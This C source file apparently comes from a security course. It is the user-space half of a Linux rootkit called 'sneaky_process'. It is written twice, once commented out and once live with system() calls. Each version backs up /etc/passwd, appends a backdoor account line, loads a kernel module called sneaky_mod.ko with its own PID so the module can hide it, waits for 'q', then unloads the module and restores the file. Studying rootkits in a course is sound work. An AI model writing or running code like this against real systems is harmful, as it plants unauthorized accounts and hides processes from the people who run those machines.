// // This is a sneaky process that will hide itself from the user.
// // This attack program will execute system calls by calling relevant APIs((for process creation, file I/O, and receiving keyboard input from standardinput)from a user program.

// // Functions:
// // 1. print its own process ID to the screen, with this format:
// // printf(“sneaky_process pid = %d\n”, getpid());
// // 2. copy the /etc/passwd file to /tmp/passwd, and then append a new line to the end of /etc/passwd with this format:
// // sneakyuser:abc123:2000:2000:sneakyuser:/root:bash

// // 3. load the sneaky kernel module (sneaky_mod.ko) into kernel by calling insmod.

// // 4. wait for the user to type “q” on the keyboard.

// // 5. unload the sneaky kernel module from kernel by calling rmmod.

// // 6. remove the line that was added to /etc/passwd in step 2.

// #include <stdio.h>
// #include <stdlib.h>
// #include <unistd.h>
// #include <sys/types.h>
// #include <sys/wait.h>
// #include <fcntl.h>

// void cpy_file(const char *src_path, const char *dest_path)
// {
//     FILE *src, *dest;
//     int sneaky_char;

//     src = fopen(src_path, "r");
//     if (src == NULL)
//     {
//         perror("Error opening src file");
//         exit(EXIT_FAILURE);
//     }

//     dest = fopen(dest_path, "w");
//     if (dest == NULL)
//     {
//         perror("Error opening dest file");
//         fclose(src);
//         exit(EXIT_FAILURE);
//     }

//     while ((sneaky_char = fgetc(src)) != EOF)
//     {
//         fputc(sneaky_char, dest);
//     }

//     fclose(src);
//     fclose(dest);
// }

// void do_sneaky(const char *sneaky_line)
// {
//     FILE *target_file;

//     // copy /etc/passwd to /tmp/passwd
//     cpy_file("/etc/passwd", "/tmp/passwd");

//     target_file = fopen("/etc/passwd", "a");
//     if (target_file == NULL)
//     {
//         perror("Error opening target file");
//         exit(EXIT_FAILURE);
//     }

//     fputs(sneaky_line, target_file);

//     fclose(target_file);
// }

// int main()
// {
//     // Step 1: Print its own process ID to the screen
//     printf("sneaky_process pid = %d\n", getpid());

//     // Step 2: Append a new line to the end of /etc/passwd
//     const char *sneaky_line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
//     do_sneaky(sneaky_line);

//     // Step 3: Load sneaky kernel module
//     pid_t pid = fork();
//     if (pid == 0)
//     {
//         char msg[50];
//         snprintf(msg, sizeof(msg), "sneaky_pid=%d", getpid());
//         execl("/sbin/insmod", "/sbin/insmod", "sneaky_mod.ko", msg, (char *)NULL);
//         exit(0);
//     }
//     waitpid(pid, NULL, 0);

//     // Step 4: Loop until 'q' is input from keyboard
//     char key_input;
//     while ((key_input = getchar()) != 'q')
//     {
//     }

//     // Step 5: Unload sneaky kernel module
//     pid = fork();
//     if (pid == 0)
//     {
//         execl("/sbin/rmmod", "/sbin/rmmod", "sneaky_mod", (char *)NULL);
//         exit(0);
//     }
//     waitpid(pid, NULL, 0);

//     // Step 6: Restore /etc/passwd
//     cpy_file("/tmp/passwd", "/etc/passwd");

//     exit(EXIT_SUCCESS);
// }

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void){
    // Step 1: Print its own process ID to the screen
    printf("sneaky_process pid = %d\n", getpid());

    // Step 2: Append a new line to the end of /etc/passwd
    system("cp /etc/passwd /tmp");
    system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n\' >> /etc/passwd");

    // Step 3: Load sneaky kernel module
    char message[32];
    sprintf(message, "insmod sneaky_mod.ko pid=%d", getpid());
    system(message);

    char key_input;
    while ((key_input = getchar()) != 'q')
    {
    }

    // Step 5: Unload sneaky kernel module
    system("rmmod sneaky_mod");

    // Step 6: Restore /etc/passwd
    system("cp /tmp/passwd /etc");
    system("rm -rf /tmp/passwd");

    return 0;
    }